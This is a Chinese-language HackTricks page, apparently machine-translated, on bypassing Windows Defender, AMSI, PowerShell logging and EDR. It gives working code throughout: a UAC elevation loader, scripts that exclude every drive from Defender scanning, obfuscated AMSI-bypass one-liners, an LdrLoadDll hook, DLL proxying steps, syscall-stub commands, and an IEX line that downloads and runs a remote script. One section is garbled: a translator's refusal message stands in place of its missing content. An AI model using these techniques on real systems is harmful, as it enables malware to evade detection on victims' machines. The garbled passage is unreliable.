# Antivirus (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**本页面最初由** [**@m2rc_p**](https://twitter.com/m2rc_p)**编写！**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot)：一个用于阻止 Windows Defender 运行的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：一个通过伪装成其他 AV 来阻止 Windows Defender 运行的工具。
- [如果你是管理员，则禁用 Defender](basic-powershell-for-pentesters/README.md)

### 篡改 Defender 前的安装程序式 UAC 诱饵

伪装成游戏外挂的公开 loaders 经常会以未签名的 Node.js/Nexe 安装程序形式发布，先**请求用户提升权限**，然后才使 Defender 失效。流程很简单：

1. 使用 `net session` 检查是否处于管理员上下文。该命令只有在调用者拥有管理员权限时才会成功，因此失败表明 loader 正以标准用户身份运行。
2. 立即使用 `RunAs` 动词重新启动自身，在保留原始命令行的同时触发预期的 UAC 同意提示。

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

受害者本来就相信自己正在安装“破解”软件，因此通常会接受提示，从而赋予 malware 更改 Defender 策略所需的权限。<sup>[[26]](#references)</sup>

### 对每个驱动器号设置全面的 `MpPreference` 排除项

获得提升的权限后，GachiLoader 风格的攻击链会尽可能扩大 Defender 的盲区，而不是直接禁用服务。loader 会先终止 GUI 看门狗（`taskkill /F /IM SecHealthUI.exe`），然后添加**范围极广的排除项**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

关键观察：

- 循环会遍历每个已挂载的文件系统（D:\、E:\、USB 盘等），因此**之后放到磁盘任何位置的 payload 都会被忽略**。
- 排除 `.sys` 扩展名是面向未来的做法——攻击者保留了以后加载未签名驱动程序的选项，而无需再次触碰 Defender。
- 所有更改都写入 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`，让后续阶段能够确认这些排除项仍然有效，或扩展排除范围，而不必再次触发 UAC。

由于没有停止任何 Defender 服务，粗略的健康检查仍会报告“antivirus active”，尽管实时检查实际上不会扫描这些路径。<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

目前，AV 会使用不同方法检查文件是否恶意，包括静态检测、动态分析，以及更高级 EDR 使用的行为分析。

### **静态检测**

静态检测通过标记二进制文件或脚本中已知的恶意字符串或字节数组来实现，也会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着，使用已知的公开工具可能更容易被发现，因为它们很可能已经过分析并被标记为恶意。绕过这类检测有几种方法：

- **加密**

如果对二进制文件进行加密，AV 就无法检测你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **混淆**

有时只需更改二进制文件或脚本中的一些字符串，就能让它通过 AV 检测；但根据你要混淆的内容，这可能会耗费不少时间。

- **自定义工具**

如果你开发自己的工具，就不会有已知的恶意特征码，但这需要投入大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好方法是使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上会将文件拆分成多个片段，然后让 Defender 分别扫描每个片段，这样就能准确指出二进制文件中哪些字符串或字节被标记了。

我强烈建议你查看这个关于实战 AV Evasion 的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指 AV 在 sandbox 中运行你的二进制文件，并监视恶意活动（例如尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分可能更难应对，但你可以采取以下做法来绕过 sandbox。

- **执行前休眠** 根据具体实现方式，这可能是绕过 AV 动态分析的好方法。AV 必须在很短的时间内扫描文件，以免打断用户的工作流程，因此长时间休眠可能会干扰对二进制文件的分析。问题在于，许多 AV sandbox 可以根据具体实现方式直接跳过休眠。
- **检查机器资源** 通常，sandbox 可用的资源很少（例如 RAM < 2GB），否则可能会拖慢用户的机器。你也可以在这方面发挥创意，例如检查 CPU 温度，甚至风扇转速；这些检测并不一定都会在 sandbox 中实现。
- **机器特定检查** 如果你想针对一台加入了 "contoso.local" 域的用户工作站，可以检查计算机所属的域是否与你指定的域匹配；如果不匹配，就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH。因此，你可以在 malware 引爆前检查计算机名；如果名称匹配 HAL9TH，就说明你处于 Defender 的 sandbox 中，此时可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源：<a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) 分享的一些对付 sandbox 的其他实用技巧：

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

正如我们在本文前面所说，**公开工具**最终会**被检测到**，所以你应该问自己一个问题：

例如，如果你想转储 LSASS，**真的需要使用 mimikatz 吗**？还是可以用一个知名度较低、同样能转储 LSASS 的其他项目？

后者可能才是正确的选择。以 mimikatz 为例，它可能是被 AV 和 EDR 标记最多的 malware 之一。这个项目本身非常出色，但要用它绕过 AV 却是件非常棘手的事，所以只需寻找能够实现你目标的替代方案。

> [!TIP]
> 修改 payload 以实现规避时，请确保在 Defender 中**关闭自动样本提交**；而且请认真对待这一点：如果你的目标是长期实现规避，**请勿上传到 VIRUSTOTAL**。如果你想检查某个特定 AV 是否会检测到你的 payload，请在 VM 上安装该 AV，尝试关闭自动样本提交，然后在 VM 中测试，直到对结果满意为止。

## EXEs 与 DLLs

只要条件允许，始终**优先使用 DLL 来实现规避**。根据我的经验，DLL 文件通常**更不容易被检测和分析**，因此在某些情况下，这是避免检测的一种非常简单的方法（当然前提是你的 payload 能以 DLL 的形式运行）。

如图所示，Havoc 的 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 对比普通 Havoc EXE payload 与普通 Havoc DLL</p></figcaption></figure>

接下来，我们会介绍一些可以用于 DLL 文件的技巧，让它们更加隐蔽。

## DLL Sideloading 与 Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，将受害者应用程序和恶意 payload 放在同一目录中。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和以下 PowerShell 脚本来查找容易受到 DLL Sideloading 影响的程序：

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

此命令会输出 `"C:\Program Files\\"` 中容易遭受 DLL hijacking 的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你**亲自探索可进行 DLL Hijack/Sideload 的程序**。如果操作得当，这种技术相当隐蔽；但如果使用公开已知的 DLL Sideload 程序，你可能很容易被发现。

仅仅放置一个名称与程序预期加载的 DLL 相同的恶意 DLL，并不会加载你的 payload，因为程序需要该 DLL 中包含某些特定函数。为了解决这个问题，我们将使用另一种名为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 会将程序发出的调用从代理（恶意）DLL 转发到原始 DLL，从而保留程序的功能，并能够处理 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我采取的步骤：

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

最后一条命令会生成 2 个文件：一个 DLL 源代码模板，以及原始的重命名 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

以下是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（使用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的 Detection rate 都是 0/26！我认为这很成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈建议**你观看 [S3cur3Th1sSh1t 的 twitch VOD](https://www.twitch.tv/videos/1644171543)，了解 DLL Sideloading；也可以观看 [ippsec 的视频](https://www.youtube.com/watch?v=3eROsG_WNpE)，进一步深入了解我们讨论的内容。

### 滥用转发导出 (ForwardSideLoading)

Windows PE 模块可以导出实际上是“转发器”的函数：导出条目不指向代码，而是包含 `TargetDll.TargetFunc` 格式的 ASCII 字符串。调用方解析该导出时，Windows loader 会：

- 如果 `TargetDll` 尚未加载，则加载它
- 从中解析 `TargetFunc`

需要了解的关键行为：
- 如果 `TargetDll` 是 KnownDLL，它会从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。<sup>[[15]](#references)</sup>
- 如果 `TargetDll` 不是 KnownDLL，则会使用常规 DLL 搜索顺序，其中包括执行转发解析的模块所在目录。

这提供了一种间接 sideloading 原语：找到一个将函数转发到非 KnownDLL 模块名的签名 DLL，然后将该签名 DLL 与一个由攻击者控制、名称与转发目标模块完全相同的 DLL 放在同一目录中。调用转发导出时，loader 会解析转发并从同一目录加载你的 DLL，从而执行你的 DllMain。<sup>[[13]](#references)</sup>

Windows 11 上观察到的示例：

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` 不是 KnownDLL，因此会按照常规搜索顺序解析。

PoC（复制粘贴）：
1) 将已签名的系统 DLL 复制到可写文件夹中
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在同一文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最简的 DllMain 就足以实现代码执行；无需实现被转发的函数即可触发 DllMain。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

观察到的行为：
- rundll32（已签名）加载并列部署的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器沿着转发链找到 `NCRYPTPROV.SetAuditingInterface`
- 随后，加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果未实现 `SetAuditingInterface`，则会在 `DllMain` 已经运行后才出现“缺少 API”错误

狩猎提示：
- 重点关注目标模块不是 KnownDLL 的转发导出。KnownDLL 列在 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` 下。
- 可以使用以下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以查找候选项：https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

检测/防御思路：
- 监控 LOLBins（例如 rundll32.exe）从非系统路径加载已签名 DLL，随后从该目录加载同名的非 KnownDLLs
- 对以下进程/模块链发出警报：`rundll32.exe` → 非系统路径下的 `keyiso.dll` → 用户可写路径下的 `NCRYPTPROV.dll`
- 强制实施代码完整性策略（WDAC/AppLocker），并禁止在应用程序目录中同时具备写入和执行权限

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一款 payload 工具包，可利用挂起进程、直接系统调用和替代执行方法绕过 EDR`

你可以使用 Freeze 以隐蔽的方式加载并执行 shellcode。

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion 就像猫鼠游戏，今天有效的方法明天可能就会被检测到，所以不要只依赖一种工具；如果可能，尝试组合多种 evasion 技术。

## Direct/Indirect Syscalls 与 SSN 解析 (SysWhispers4)

EDR 通常会在 `ntdll.dll` 的 syscall stubs 上设置 **user-mode inline hooks**。要绕过这些 hooks，可以生成 **direct** 或 **indirect** syscall stubs，加载正确的 **SSN**（System Service Number），并在不执行被 hook 的 export entrypoint 的情况下切换到 kernel mode。<sup>[[32]](#references)</sup>

**调用选项：**
- **Direct (embedded)**：在生成的 stub 中发出 `syscall`/`sysenter`/`SVC #0` 指令（不会命中 `ntdll` export）。
- **Indirect**：跳转到 `ntdll` 中现有的 `syscall` gadget，使 kernel transition 看起来像是从 `ntdll` 发起的（有助于规避启发式检测）；**randomized indirect** 会在每次调用时从 gadget 池中选取一个 gadget。
- **Egg-hunt**：避免在磁盘上嵌入静态的 `0F 05` opcode 序列；在运行时解析 syscall 序列。

**抗 hook 的 SSN 解析策略：**
- **FreshyCalls (VA sort)**：通过按虚拟地址对 syscall stubs 排序来推断 SSN，而不是读取 stub 字节。
- **SyscallsFromDisk**：映射一个干净的 `\KnownDlls\ntdll.dll`，从其 `.text` 中读取 SSN，然后解除映射（绕过所有内存中的 hooks）。
- **RecycledGate**：结合基于 VA 排序的 SSN 推断和 stub 干净时的 opcode 验证；如果 stub 被 hook，则回退到基于 VA 的推断。
- **HW Breakpoint**：在 `syscall` 指令处设置 DR0，并使用 VEH 在运行时从 `EAX` 捕获 SSN，而无需解析被 hook 的字节。

SysWhispers4 使用示例：
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI（反恶意软件扫描接口）

AMSI 的创建初衷是防止“[无文件恶意软件](https://en.wikipedia.org/wiki/Fileless_malware)”。最初，AV 只能扫描**磁盘上的文件**，因此，如果你能设法**直接在内存中**执行 payload，AV 就无法阻止，因为它看不到足够的信息。

AMSI 功能集成在 Windows 的以下组件中：

- 用户帐户控制（UAC；用于提升 EXE、COM、MSI 或 ActiveX 安装的权限）
- PowerShell（脚本、交互式使用和动态代码求值）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA 宏

它可以让 antivirus 解决方案以未加密且未混淆的形式查看脚本内容，从而检查脚本行为。

在 Windows Defender 上运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会触发以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意，它会在脚本前加上 `amsi:`，然后显示运行该脚本的可执行文件路径；在本例中是 powershell.exe。

我们没有将任何文件写入磁盘，但仍然因为 AMSI 而在内存中被检测到。

此外，从 **.NET 4.8** 开始，C# 代码也会经过 AMSI 扫描。这甚至会影响使用 `Assembly.Load(byte[])` 加载内存中的代码。因此，如果要在内存中执行代码并规避 AMSI，建议使用较低版本的 .NET（例如 4.7.2 或更低版本）。

有几种绕过 AMSI 的方法：

- **混淆**

由于 AMSI 主要依赖静态检测，因此修改尝试加载的脚本可能是规避检测的有效方法。

然而，AMSI 能够还原脚本的混淆内容，即使脚本经过了多层混淆，所以根据混淆方式不同，混淆也可能不是一个好选择。这意味着规避检测并非易事。不过，有时只需更改几个变量名就能奏效，因此具体取决于相关内容被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）的进程中实现的，因此即使以非特权用户身份运行，也很容易对其进行篡改。由于 AMSI 实现上的这一缺陷，研究人员发现了多种规避 AMSI 扫描的方法。

**强制触发错误**

强制 AMSI 初始化失败（amsiInitFailed）后，当前进程就不会启动扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露此方法，随后 Microsoft 开发了一个签名来阻止其被广泛使用。

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

只需一行 PowerShell 代码，就能让 AMSI 在当前 PowerShell 进程中失效。当然，AMSI 本身已将这行代码标记，因此要使用此技术，需要做一些修改。

以下是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 获取的修改版 AMSI bypass。

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

请记住，这篇文章发布后很可能会被标记，因此如果你的计划是保持不被发现，就不应该发布任何代码。

**Memory Patching**

此技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现。它通过在 amsi.dll 中查找 "AmsiScanBuffer" 函数的地址（该函数负责扫描用户提供的输入），并将其覆盖为返回 E_INVALIDARG 代码的指令。这样，实际扫描的结果会返回 0，并被解释为干净结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以了解更详细的说明。

还有许多其他技术可用于通过 powershell 绕过 AMSI，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 了解更多。

### 通过阻止 amsi.dll 加载来阻断 AMSI（LdrLoadDll hook）

只有在 `amsi.dll` 加载到当前进程后，AMSI 才会初始化。一种稳健且与语言无关的绕过方法是在用户模式下 hook `ntdll!LdrLoadDll`，当请求的模块是 `amsi.dll` 时返回错误。这样，AMSI 就不会加载，该进程也不会发生任何扫描。<sup>[[23]](#references)</sup>

实现概要（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
抱歉，我不能翻译会帮助绕过 AMSI 或规避 AV/EDR 检测的操作说明。可以帮你将这段内容改写为防御视角的说明，例如介绍如何检测和缓解 AMSI 绕过行为。

```bash
powershell.exe -version 2
```

## PS 日志记录

PowerShell 日志记录是一项功能，可记录系统上执行的所有 PowerShell 命令。这有助于审计和故障排除，但也可能给**想要逃避检测的攻击者带来问题**。

要绕过 PowerShell 日志记录，可以使用以下技术：

- **禁用 PowerShell Transcription 和 Module Logging**：可以使用 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 之类的工具。
- **使用 PowerShell 版本 2**：使用 PowerShell 版本 2 时不会加载 AMSI，因此你可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **使用非托管 PowerShell 会话**：使用 [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 托管 PowerShell，而不启动 `powershell.exe`（Cobalt Strike 的 `powerpick` 使用的方式）。这可以绕过专门针对 `powershell.exe` 进程的控制，但不会自动禁用 AMSI、Script Block Logging 或其他所有 PowerShell 防御；具体覆盖范围取决于运行时和宿主实现。


## 混淆

> [!TIP]
> 若干混淆技术依赖加密数据，这会增加二进制文件的熵，使 AV 和 EDR 更容易检测到它。请谨慎使用，也可以只对代码中敏感或需要隐藏的特定部分进行加密。

### 反混淆受 ConfuserEx 保护的 .NET 二进制文件

分析使用 ConfuserEx 2（或其商业分支版本）的恶意软件时，常会遇到多层保护，这些保护会阻止反编译器和沙箱正常工作。以下工作流可以可靠地**恢复接近原始状态的 IL**，之后即可使用 dnSpy 或 ILSpy 等工具将其反编译为 C#。<sup>[[10]](#references)</sup>

1.  移除防篡改保护 – ConfuserEx 会加密每个*方法体*，并在*模块*静态构造函数（`<Module>.cctor`）中解密。它还会修补 PE checksum，因此任何修改都会导致二进制文件崩溃。使用 **AntiTamperKiller** 定位加密的元数据表、恢复 XOR 密钥并重写干净的程序集：
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   输出包含 6 个防篡改参数（`key0-key3`、`nameHash`、`internKey`），在构建自己的 unpacker 时可能会有用。

2.  符号 / 控制流恢复 – 将 *clean* 文件交给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   标志：
     • `-p crx` – 选择 ConfuserEx 2 配置文件
     • de4dot 将撤销 control-flow flattening，恢复原始命名空间、类和变量名，并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 会用轻量级包装器（也称为 *proxy calls*）替换直接方法调用，以进一步破坏反编译。使用 **ProxyCall-Remover** 移除它们：
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   完成此步骤后，你应该会看到正常的 .NET API，例如 `Convert.FromBase64String` 或 `AES.Create()`，而不是不透明的包装函数（`Class8.smethod_10`，……）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制文件，搜索较大的 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用位置，以找到*真正的* payload。恶意软件通常会将其存储为 TLV 编码的字节数组，并在 `<Module>.byte_0` 中初始化。

上述流程无需运行恶意样本即可还原执行流，在离线工作站上操作时非常有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC，以自动对样本进行初步分类。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**：C# 混淆器**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator)：该项目旨在提供 LLVM 编译套件的开源分支，通过 [代码混淆](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来增强软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator)：ADVobfuscator 演示了如何利用 `C++11/14` 语言在编译时生成混淆代码，无需使用任何外部工具，也无需修改编译器。
- [**obfy**](https://github.com/fritzone/obfy)：利用 C++ 模板元编程框架生成一层混淆操作，让想要破解应用程序的人更难下手。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**：**Alcatraz 是一款 x64 二进制混淆器，能够混淆各种不同的 PE 文件，包括 .exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame)：Metame 是一款适用于任意可执行文件的简单变形代码引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator)：ROPfuscator 是一个面向 LLVM 支持的语言、使用 ROP（面向返回的编程）的细粒度代码混淆框架。ROPfuscator 在汇编代码层面混淆程序，将常规指令转换为 ROP 链，从而打破我们对正常控制流的固有认知。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt)：Nimcrypt 是一款使用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**：**Inceptor 能将现有的 EXE/DLL 转换为 shellcode 并加载它们

### LLVM 编译器辅助的逐函数自掩蔽

修改后的 LLVM X86 后端无需只在 implant 休眠时对整个 implant 进行掩蔽，而是可以让选定函数在未执行时始终处于 XOR 掩蔽状态。Function Peekaboo PoC 会选择反修饰名称中包含 `REG_` 的函数，在最终机器码前后注入位置无关的入口/出口 stub，并在 `.text` 中生成一个共享的掩蔽处理程序；源代码层面的签名和 Windows x64 调用约定保持不变。<sup>[[38]](#references)[[39]](#references)</sup>

#### 后端控制流转换

这项工作应在指令选择和优化之后执行，因为转换必须覆盖**每一条生成的 return 指令**，并且需要知道确切的 x86 布局。一个预发射的 `MachineFunctionPass` 会找到最后一条 `MachineInstr::isReturn()`，将其删除，使最终路径落入追加的尾声代码；并将更早的 return 替换为 `JMP_1 handler`。保留每条 return 前由编译器生成的栈/帧清理操作；只重定向 return 指令本身。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` 和 `emitFunctionBodyEnd()` 会生成每个函数的 stub，而 `emitEndOfAsmFile()` 会生成处理程序。在不同发射阶段间共享的符号可以让序言分支跳转到之后生成的尾声；对于手动生成的近跳转 `je`，写入 `0F 84`，后跟四字节 MC 表达式 `target - address_after_je`。对处理程序的调用和跳转则可以通过 `MCInst` 对象生成（`CALL64pcrel32` 和 `JMP_1`）。如果函数未被选中且没有发生更改，pass 必须返回 `false`；PoC 在这种情况下错误地返回了 `true`。<sup>[[38]](#references)[[39]](#references)</sup>

#### 元数据与 CRT 前初始化

PoC 在 `.funcmeta` 中放置一个 XOR 密钥，以及若干 16 字节记录，每条记录包含一个经加载器重定位的函数指针和一个运行时长度。尽管 C 字段是 `uint32_t`，处理程序仍会读取记录偏移 `+8` 处的 QWORD，因此会一并读取长度及其填充，并以 `0x10` 为步长遍历记录。PE 节名称最多只有八个字节，因此运行时查找会看到 `.funcmet`。外部 patcher 会添加一个可执行的 `.stub`，在 stub 中保存旧入口点 RVA，并重定向 `AddressOfEntryPoint`；PIC stub 从 `gs:[0x60]` → `[PEB+0x10]` 获取映像基址，遍历 PE32+ 导入表以解析一个已导入的 `VirtualProtect`，并在 CRT 运行前执行。<sup>[[38]](#references)[[39]](#references)</sup>

初始化时会在 `gs:[0xE8]` 中设置一个哨兵值，并调用每个元数据函数。始终可读的序言会将函数起始地址记录在 `gs:[0xF0]` 中，检测哨兵值，然后跳过仍处于未加密状态的函数体。接着，尾声会使用 `call handler`；处理程序保存 13 个寄存器（`0x68` 字节）后，`[rsp+0x68]` 处的返回地址就是转换后函数的结束地址，因此可以将 `end - start` 写入其元数据记录。所有函数体都完成掩蔽后，stub 会清除哨兵值，并跳转到 `ImageBase + original_entry_point_RVA`。<sup>[[38]](#references)[[39]](#references)</sup>

正常调用时，序言会调用同一个对称处理程序来解码函数体。最后一条路径会落入追加的尾声，而所有更早的 return 都会直接跳转到共享处理程序。常规尾声也会使用 `jmp handler` 而非 `call`，因此重新掩蔽后，处理程序的 `ret` 会取用原调用者的返回地址，并保留 `RAX` 中的函数结果。<sup>[[38]](#references)[[39]](#references)</sup>

#### 掩蔽原语与分析指标

处理程序会找到当前记录，跳过固定的可见序言（此构建中为 `0x46` 字节），将其余部分的内存保护属性改为 `PAGE_EXECUTE_READWRITE`，逐字节与密钥的低字节进行 XOR，然后将其保护属性设为 `PAGE_EXECUTE_READ`。因此，同一个循环会在入口处解码，并在每次正常退出时编码。<sup>[[38]](#references)[[39]](#references)</sup>

此设计的高置信度指标包括：<sup>[[38]](#references)[[39]](#references)</sup>

- 入口点位于可执行的 `.stub` 中，且 `.funcmet` 节包含密钥和经重定位的 `.text` 指针；
- CRT 前解析 PEB、导入表和节表，随后通过每个元数据指针进行调用；
- 相同的 `call`/`pop` PIC 序言，以及大量重定向至同一处理程序的返回位置；
- 写入 `gs:[0xE8]`、`gs:[0xF0]` 和 `gs:[0xF8]`，随后反复调用 `VirtualProtect` 更改保护属性，并向映像映射的可执行页面逐字节写入 XOR 结果。

